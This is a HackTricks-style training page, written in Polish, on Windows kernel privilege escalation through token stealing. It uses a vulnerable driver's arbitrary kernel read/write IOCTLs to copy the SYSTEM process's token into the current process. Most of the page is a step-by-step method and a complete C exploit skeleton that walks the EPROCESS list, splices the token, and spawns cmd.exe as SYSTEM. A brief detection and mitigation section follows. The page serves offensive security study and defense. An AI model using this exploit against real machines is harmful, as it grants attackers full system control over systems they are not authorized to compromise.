# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Przegląd

Jeśli podatny driver ujawnia IOCTL, który daje atakującemu arbitrary kernel read i/lub write primitives, podniesienie uprawnień do NT AUTHORITY\SYSTEM można często osiągnąć przez kradzież tokenu dostępu SYSTEM. Technika kopiuje wskaźnik Token z EPROCESS procesu SYSTEM do EPROCESS bieżącego procesu.

Dlaczego to działa:
- Każdy proces ma strukturę EPROCESS, która zawiera (między innymi polami) Token (w rzeczywistości EX_FAST_REF do obiektu tokenu).
- Proces SYSTEM (PID 4) posiada token ze wszystkimi uprawnieniami włączonymi.
- Podmiana EPROCESS.Token bieżącego procesu na wskaźnik tokenu SYSTEM powoduje, że bieżący proces natychmiast działa jako SYSTEM.

> Offsets w EPROCESS różnią się między wersjami Windows. Określ je dynamicznie (symbols) lub użyj stałych specyficznych dla wersji. Pamiętaj też, że EPROCESS.Token jest EX_FAST_REF (niskie 3 bity to flagi licznika referencji).

## Główne kroki

1) Zlokalizuj bazę ntoskrnl.exe i rozwiąż adres PsInitialSystemProcess.
- Z poziomu user mode użyj NtQuerySystemInformation(SystemModuleInformation) lub EnumDeviceDrivers, aby uzyskać bazy załadowanych driverów.
- Dodaj offset PsInitialSystemProcess (z symbols/reversing) do bazy kernela, aby otrzymać jego adres.
2) Odczytaj wskaźnik pod PsInitialSystemProcess → to jest kernel pointer do EPROCESS procesu SYSTEM.
3) Z EPROCESS procesu SYSTEM odczytaj offsety UniqueProcessId i ActiveProcessLinks, aby przejść po dwukierunkowej liście EPROCESS (ActiveProcessLinks.Flink/Blink) aż znajdziesz EPROCESS którego UniqueProcessId równa się GetCurrentProcessId(). Zachowaj oba:
- EPROCESS_SYSTEM (dla SYSTEM)
- EPROCESS_SELF (dla bieżącego procesu)
4) Odczytaj wartość tokenu SYSTEM: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Zamaskuj niskie 3 bity: Token_SYS_masked = Token_SYS & ~0xF (często ~0xF lub ~0x7 zależnie od buildu; na x64 używane są niskie 3 bity — maska 0xFFFFFFFFFFFFFFF8).
5) Option A (common): Zachowaj niskie 3 bity z twojego bieżącego tokenu i wklej je na wskaźnik SYSTEM, aby zachować spójność wewnętrznego ref count.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Zapisz Token_NEW z powrotem do (EPROCESS_SELF + TokenOffset) używając swojego kernel write primitive.
7) Twój bieżący proces jest teraz SYSTEM. Opcjonalnie uruchom nowy cmd.exe lub powershell.exe, aby potwierdzić.

## Pseudokod

Poniżej szkielet, który używa tylko dwóch IOCTLs z podatnego drivera — jednego do 8-byte kernel read i jednego do 8-byte kernel write. Zastąp interfejsem twojego drivera.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Notatki:
- Offsety: Użyj WinDbg i polecenia `dt nt!_EPROCESS` z PDBs celu lub loaderem symboli w czasie wykonywania, aby uzyskać poprawne offsety. Nie hardkoduj tego na ślepo.
- Maska: Na x64 token jest EX_FAST_REF; niskie 3 bity to bity licznika referencji. Zachowanie oryginalnych niskich bitów w tokenie zapobiega natychmiastowym niespójnościom licznika referencji.
- Stabilność: Preferuj podniesienie uprawnień bieżącego procesu; jeśli podniesiesz krótkotrwały helper, możesz stracić SYSTEM po jego zakończeniu.

## Wykrywanie i łagodzenie
- Ładowanie niepodpisanych lub nieufanych sterowników firm trzecich, które udostępniają potężne IOCTLs, jest główną przyczyną.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard i reguły Attack Surface Reduction mogą zapobiec załadowaniu podatnych sterowników.
- EDR może monitorować podejrzane sekwencje IOCTL implementujące arbitrary read/write oraz token swaps.

## Referencje
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
